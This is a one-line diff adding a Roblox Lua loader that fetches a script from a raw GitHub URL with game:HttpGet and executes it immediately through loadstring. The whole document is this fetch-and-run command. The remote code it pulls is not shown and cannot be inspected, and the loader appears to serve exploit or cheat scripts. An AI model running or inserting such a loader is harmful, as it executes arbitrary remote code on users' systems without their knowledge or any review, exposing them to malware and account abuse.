@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/peripheral-beta-spam7-z8442sbpo6rypp.lua"))()
